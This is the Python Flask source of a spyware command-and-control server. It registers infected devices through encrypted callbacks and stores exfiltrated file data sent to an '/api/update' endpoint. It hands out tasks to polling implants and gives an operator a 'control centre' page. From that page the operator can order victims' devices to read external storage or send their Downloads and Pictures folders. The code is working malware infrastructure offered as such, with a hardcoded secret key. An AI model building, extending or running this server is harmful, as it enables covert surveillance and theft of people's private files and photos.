from flask import Flask, flash, request, redirect, url_for, send_file, render_template, render_template_string
from datetime import datetime
from encryption import *
from utils import print_debug


PACKET_CALLBACK = 0x1
PACKET_SUCCESS = 0x2
PACKET_ERROR = 0xFF
PACKET_DATA = 0x3

app = Flask(__name__)
app.secret_key = b'\xed\xa1\x80\t\xa5n_\xcd\xb7\xfc\x83\xa20\x13]\x9b\xfe\xf3\xc4\xd3\xa5'


class Client:
    def __init__(self, addr, data):
        self.id: bytes = data[1:5]
        self.addr = addr
        # 16 byte rc4 key
        self.key: bytes = data[5:21]
        self.current_task = None


class Command:
    """
    Instance of a command the C2 can send
    Each command is identified by both Command Code and the arguments provided (to support getting of both Downloads and Pictures)

    label_value is used to tag the dropdown option with the appropriate identifier for the command
    command_code and arguments are delimited by a _

    get_payload returns the appropriate command to send the server:
    currently the format is <command_code><args if any>
    """

    def __init__(self, command_code, label, arg=None):
        self.command_code = command_code
        self.label = label
        self.label_value = str(command_code)

        if arg:
            self.label_value += f'_{arg}'

        self.arg = arg

    def get_payload(self):
        command_code = bytes([self.command_code])
        if self.arg:
            arg = self.arg.encode()
            return command_code + arg
        return command_code


clients: dict[bytes, Client] = {}

# Placeholder for supported commands, to be updated when Spyware features fully implemented
commands = [
    Command(0x0, "Read External Storage"),
    Command(0x1, "Get Downloads", "downloads"),
    Command(0x1, "Get Pictures", "pictures")
]


def lookup_command(command_code, arg):
    for command in commands:
        if command.command_code == command_code and command.arg == arg:
            return command


def process_callback(addr, data):
    print_debug(f'data: {data}')
    global clients
    # 4 byte client id
    client_id = data[1:5].hex().upper()
    print_debug(f'Callback: {client_id}')
    if client_id not in clients.keys():
        # add client to list
        clients[client_id] = Client(addr, data)
        return client_id
    # conflict in id, ask client to regen
    return None


# tentatively receive data from exfil
@app.route('/api/update', methods=['POST'])
def recv_data():
    data = decrypt(request.data)
    if data[0] == PACKET_CALLBACK:
        client_id = process_callback(request.remote_addr, data)
        if client_id:
            print_debug('got new client!')
            return encrypt("success", clients[client_id].key)
        # cant encrypt since no key
        return render_template_string('PageNotFound {{ errorCode }}', errorCode='404'), 404

    elif data[0] == PACKET_DATA:
        now = datetime.now()
        client_id = data[1:5].hex().upper()
        file_name = clients[client_id].id.hex() + '_' + \
            now.strftime("%d-%m-%Y_%H:%M:%S")
        with open(file_name, 'wb') as f:
            f.write(data[5:])
        print_debug(data[5:20])
        return encrypt("success", clients[client_id].key)


# provides commands for poll
@app.route('/api/notification', methods=['GET'])
def provide_command():
    client_id = request.args.get('id')
    client = clients.get(client_id)
    print_debug(client_id)
    data = client.current_task.get_payload()
    print_debug(data)
    data = encrypt(data, clients[client_id].key)
    print_debug(data)
    return data


@app.route('/control_centre', methods=['GET', 'POST'])
def control_centre():

    if request.method == 'POST':
        # get command to run from control centre here
        command_arg_pair = request.form.get('command').split('_')

        if len(command_arg_pair) == 2:
            command_code, arg = command_arg_pair
        else:
            command_code = command_arg_pair[0]
            arg = None

        command_code = int(command_code)

        target_id = request.form.get('target')
        print_debug(f'Command for {target_id}: {command_code}')

        target = clients.get(target_id)

        if not target:
            return render_template_string('PageNotFound {{ errorCode }}', errorCode='404'), 404

        command = lookup_command(command_code, arg)
        target.current_task = command

    return render_template('control_centre.html', clients=clients.items(), commands=commands)
